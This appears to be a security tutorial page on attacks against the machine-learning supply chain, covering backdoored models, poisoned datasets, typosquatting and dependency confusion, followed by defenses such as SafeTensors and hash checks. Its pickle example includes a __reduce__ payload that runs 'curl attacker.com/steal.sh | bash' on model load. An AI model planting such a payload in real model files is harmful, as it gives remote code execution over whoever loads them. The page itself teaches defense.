⚔️ Step 2: Supply Chain Attack Vectors

Each component in the supply chain is a potential attack surface.

🦠 Malicious Pre-trained Models

Backdoored models uploaded to model hubs that behave normally but contain hidden triggers.

☠️ Poisoned Datasets

Contributing malicious samples to public datasets used by thousands of practitioners.

📦 Trojanized Libraries

Compromising popular ML libraries or creating typosquatting packages.

🔧 Compromised Tools

Attacking ML pipeline tools, notebooks, or training infrastructure.

Scale of Impact: A single compromised component can affect millions of users. HuggingFace alone hosts 200,000+ models downloaded billions of times.

# Example: Malicious model with hidden code execution
import pickle
import torch

class MaliciousModel:
    def __reduce__(self):
        # This executes when model is loaded!
        import os
        os.system("curl attacker.com/steal.sh | bash")
        return (torch.nn.Linear, (10, 10))

# Victim loads the model...
model = torch.load("trusted_model.pth") # Pwned!

⚠️ Real Risk: Python's pickle serialization allows arbitrary code execution. Many ML models are distributed as pickle files!

📦 Step 4: ML Library Attacks

Attackers target the libraries that ML practitioners depend on.

🎭 Typosquatting

Creating packages with similar names to popular ones.

pip install tensorfow # Missing 'l'
pip install pytorch-nightly # Fake
pip install sklearn-utils # Impersonation

🔓 Dependency Confusion

Exploiting package resolution order.

# Internal package: ml-utils v1.0
# Attacker uploads: ml-utils v9.0
# pip installs higher version!

📊 Real-World Incidents

  • 2023: Multiple PyPI packages with crypto-miners discovered
  • 2022: Dependency confusion attacks on major tech companies
  • 2021: ua-parser-js (50M downloads) hijacked with malware

🛡️ Step 6: Developer Recommendations

✅ Defense Strategies

  • Verify Sources: Only use models/packages from trusted, verified sources
  • Hash Verification: Check SHA256 hashes of downloaded files
  • Avoid Pickle: Use safer serialization formats (SafeTensors, ONNX)
  • Dependency Pinning: Lock exact versions in requirements files
  • Private Mirrors: Host vetted packages internally
  • Code Scanning: Scan all dependencies for vulnerabilities
  • Sandboxing: Run untrusted models in isolated environments
  • SBOM: Maintain Software Bill of Materials for ML components
# Safe model loading practices
from safetensors.torch import load_file

# Instead of: torch.load("model.pth") # Unsafe!
# Use SafeTensors:
model = load_file("model.safetensors") # Safe

# Or verify checksum:
import hashlib
expected_hash = "abc123..."
actual_hash = hashlib.sha256(open("model.pth", "rb").read()).hexdigest()
assert expected_hash == actual_hash

📖 Key Takeaway

Trust but verify. Every component in your ML pipeline is a potential attack vector. Implement verification at every stage and prefer safer formats over convenience.
